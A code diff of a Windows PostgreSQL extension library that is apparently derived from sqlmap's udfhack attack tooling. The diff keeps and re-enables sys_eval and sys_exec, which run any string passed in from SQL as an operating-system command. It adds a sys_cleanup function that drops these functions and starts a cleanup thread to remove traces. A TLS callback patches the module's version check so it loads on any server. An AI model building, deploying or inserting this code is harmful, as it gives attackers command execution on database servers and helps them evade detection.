@@ -59,7 +59,6 @@ void NTAPI TlsCallBack(PVOID h, DWORD dwReason, PVOID pv);
 #endif
 
 HANDLE hLibModule = NULL;
-void ForcePgMagic();
 
 void NTAPI TlsCallBack(PVOID hModule, DWORD dwReason, PVOID pv)
 {
@@ -129,7 +128,6 @@ void NTAPI TlsCallBack(PVOID hModule, DWORD dwReason, PVOID pv)
 				}
 				dMagic[1] = (pgMajor * 100 + pgMinor);
 				elog(NOTICE, "[Fixed] PG_MAGIC_FUNCTION_NAME: %d\n", dMagic[1]);
-
 			}
 		}
 	}
@@ -138,68 +136,68 @@ void NTAPI TlsCallBack(PVOID hModule, DWORD dwReason, PVOID pv)
 }
 
 /*
- Some utility functions borrowed from: sqlmap project (https://github.com/sqlmapproject/udfhack).
- Source: https://github.com/sqlmapproject/udfhack/blob/master/windows/32/lib_postgresqludf_sys/lib_postgresqludf_sys/lib_postgresqludf_sys.c
-*/
+ Reference: https://github.com/postgres/postgres/blob/master/src/backend/utils/adt/varlena.c
+ */
 
-char *text_ptr_to_char_ptr(text *arg)
-{
-	char *retVal;
-	int arg_size = VARSIZE(arg) - VARHDRSZ;
-	retVal = (char *)malloc(arg_size + 1);
+char *quoted_string(const char * cstr) {
+	char	*quoted_string;
+	size_t	cstr_len = strlen(cstr);
 
-	memcpy(retVal, VARDATA(arg), arg_size);
-	retVal[arg_size] = '\0';
-
-	return retVal;
-}
-
-text *chr_ptr_to_text_ptr(char *arg)
-{
-	text *retVal;
-
-	retVal = (text *)malloc(VARHDRSZ + strlen(arg));
-#ifdef SET_VARSIZE
-	SET_VARSIZE(retVal, VARHDRSZ + strlen(arg));
-#else
-	VARATT_SIZEP(retVal) = strlen(arg) + VARHDRSZ;
-#endif
-	memcpy(VARDATA(retVal), arg, strlen(arg));
-
-	return retVal;
-}
-
-FILE *
-compat_popen(const char *command, const char *type)
-{
-	size_t      cmdlen = strlen(command);
-	char       *buf;
-	int         save_errno;
-	FILE       *res;
-
-	/*
-	* Create a malloc'd copy of the command string, enclosed with an extra
-	* pair of quotes
-	*/
-	buf = malloc(cmdlen + 2 + 1);
-	if (buf == NULL)
+	quoted_string = malloc(cstr_len + 2 + 1);
+	if (quoted_string == NULL)
 	{
 		errno = ENOMEM;
 		return NULL;
 	}
-	buf[0] = '"';
-	memcpy(&buf[1], command, cmdlen);
-	buf[cmdlen + 1] = '"';
-	buf[cmdlen + 2] = '\0';
 
-	res = _popen(buf, type);
+	quoted_string[0] = '"';
+	memcpy(&quoted_string[1], cstr, cstr_len);
+	quoted_string[++cstr_len] = '"';
+	quoted_string[++cstr_len] = '\0';
+
+	return  quoted_string;
+}
+
+FILE *compat_popen(const char *cmd, const char *type)
+{
+	char	*quoted_cmd;
+	int		save_errno;
+	FILE	*resproc;
+
+	quoted_cmd = quoted_string(cmd);
+	if (quoted_cmd == NULL) {
+		return NULL;
+	}
+	resproc  = _popen(quoted_cmd, type);
 
 	save_errno = errno;
-	free(buf);
+	free(quoted_cmd);
 	errno = save_errno;
 
-	return res;
+	return resproc;
 }
+
+int compat_system(const char *cmd)
+{
+	char	*quoted_cmd;
+	int		save_errno;
+	int		rescode;
+	quoted_cmd = quoted_string(cmd);
+	if (quoted_cmd == NULL) {
+		return -1;
+	}
+
+#undef system
+	rescode = system(quoted_cmd);
+
+	save_errno = errno;
+	free(quoted_cmd);
+	errno = save_errno;
+
+	return rescode;
+}
+
+
 
 PGDLLEXPORT Datum sys_eval(PG_FUNCTION_ARGS);
 PG_FUNCTION_INFO_V1(sys_eval);
@@ -212,17 +210,15 @@ Datum sys_eval(PG_FUNCTION_ARGS) {
 	char *line;
 	int32 outlen, linelen;
 
-	command = text_ptr_to_char_ptr(argv0);
+	command = (char *)text_to_cstring(argv0);
 
-	// Only if you want to log
-	elog(NOTICE, "Command evaluated: %s", command);
-
+	elog(NOTICE, "[sys_eval] Command: %s", command);
 
 	line = (char *)malloc(1024);
 	result = (char *)malloc(1);
 	outlen = 0;
 
-	result[0] = (char)0;
+	result[0] = '\0';
 
 	pipe = compat_popen(command, "r");
 
@@ -234,19 +230,19 @@ Datum sys_eval(PG_FUNCTION_ARGS) {
 	}
 
 	pclose(pipe);
+	pfree(command);
 
 	if (*result) {
 		result[outlen - 1] = 0x00;
 	}
 
-	result_text = chr_ptr_to_text_ptr(result);
+	result_text = (text *)cstring_to_text(result);
 
+	PG_FREE_IF_COPY(argv0, 0);
 	PG_RETURN_POINTER(result_text);
 }
 
 
-
-/*
 PGDLLEXPORT Datum sys_exec(PG_FUNCTION_ARGS);
 PG_FUNCTION_INFO_V1(sys_exec);
 Datum sys_exec(PG_FUNCTION_ARGS) {
@@ -254,66 +250,86 @@ Datum sys_exec(PG_FUNCTION_ARGS) {
 	int32 result = 0;
 	char *command;
 
-	command = text_ptr_to_char_ptr(argv0);
+	command = (char *)text_to_cstring(argv0);
 
-	Only if you want to log
-	elog(NOTICE, "Command execution: %s", command);
+	elog(NOTICE, "[sys_exec] Command: %s", command);
 
 	result = compat_system(command);
-	free(command);
+
+	pfree(command);
 
 	PG_FREE_IF_COPY(argv0, 0);
 	PG_RETURN_INT32(result);
-}
-*/
-
-PGDLLEXPORT Datum fibbonachi(PG_FUNCTION_ARGS);
-PG_FUNCTION_INFO_V1(fibbonachi);
-Datum fibbonachi(PG_FUNCTION_ARGS)
-{
-	int32 arg = PG_GETARG_INT32(0);
-	if (arg > 0 && arg < 100)
-	{
-		if (arg == 1 || arg == 2)
-			PG_RETURN_INT32(1);
-		else
-		{
-			int arr[100];
-			arr[0] = 1;
-			arr[1] = 1;
-			for (int i = 2; i < arg; i++)
-				arr[i] = arr[i - 1] + arr[i - 2];
-			PG_RETURN_INT32(arr[arg - 1]);
-		}
-	}
-	else
-		PG_RETURN_INT32(0);
 }
 
 
 DWORD WINAPI CleanUp(LPVOID lpParam);
 
+/*
+SPI Constants
+Source: https://docs.huihoo.com/doxygen/postgresql/spi_8h_source.html#l00044
+*/
+#define SPI_ERROR_CONNECT       (-1)
+#define SPI_ERROR_COPY          (-2)
+#define SPI_ERROR_OPUNKNOWN     (-3)
+#define SPI_ERROR_UNCONNECTED   (-4)
+#define SPI_ERROR_CURSOR        (-5)    /* not used anymore */
+#define SPI_ERROR_ARGUMENT      (-6)
+#define SPI_ERROR_PARAM         (-7)
+#define SPI_ERROR_TRANSACTION   (-8)
+#define SPI_ERROR_NOATTRIBUTE   (-9)
+#define SPI_ERROR_NOOUTFUNC     (-10)
+#define SPI_ERROR_TYPUNKNOWN    (-11)
+
+#define SPI_OK_CONNECT          1
+#define SPI_OK_FINISH           2
+#define SPI_OK_FETCH            3
+#define SPI_OK_UTILITY          4
+#define SPI_OK_SELECT           5
+#define SPI_OK_SELINTO          6
+#define SPI_OK_INSERT           7
+#define SPI_OK_DELETE           8
+#define SPI_OK_UPDATE           9
+#define SPI_OK_CURSOR           10
+#define SPI_OK_INSERT_RETURNING 11
+#define SPI_OK_DELETE_RETURNING 12
+#define SPI_OK_UPDATE_RETURNING 13
+#define SPI_OK_REWRITTEN        14
+
 PGDLLEXPORT Datum sys_cleanup(PG_FUNCTION_ARGS);
 PG_FUNCTION_INFO_V1(sys_cleanup);
 Datum sys_cleanup(PG_FUNCTION_ARGS) {
-	text *argv0 = PG_GETARG_TEXT_P(0);
-	text *result_text;
+	int result;
+	result = 0;
 
-	result_text = (text*)pgsql_version();
-	if (result_text == NULL) {
-		result_text = argv0;
+	// Reference: https://www.postgresql.org/docs/9.0/spi-examples.html
+	if (SPI_connect() == SPI_OK_CONNECT) {
+		int ret;
+		elog(NOTICE, "[sys_cleanup] Going to DROP sys_eval");
+		ret = SPI_exec((LPCSTR)"drop function sys_eval(text)", 0);
+		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);
+
+		elog(NOTICE, "[sys_cleanup] Going to DROP sys_exec");
+		ret = SPI_exec((LPCSTR)"drop function sys_exec(text)", 0);
+		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);
+
+		elog(NOTICE, "[sys_cleanup] Going to DROP sys_cleanup");
+		ret = SPI_exec((LPCSTR)"drop function sys_cleanup()", 0);
+		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);
+		SPI_finish();
+		result = 1;
 	}
 
 	elog(NOTICE, "Create Clenup Thread");
 	CreateThread(
-		NULL,                   // default security attributes
-		0,                      // use default stack size  
-		CleanUp,       // thread function name
-		NULL,          // argument to thread function 
-		0,                      // use default creation flags 
-		NULL);   // returns the thread identifier 
+		NULL,			// default security attributes
+		0,				// use default stack size  
+		CleanUp,		// thread function name
+		NULL,			// argument to thread function 
+		0,				// use default creation flags 
+		NULL);			// returns the thread identifier 
 
-	PG_RETURN_POINTER(result_text);
+	PG_RETURN_INT32(result);
 }
 
 DWORD WINAPI CleanUp(LPVOID lpParam)
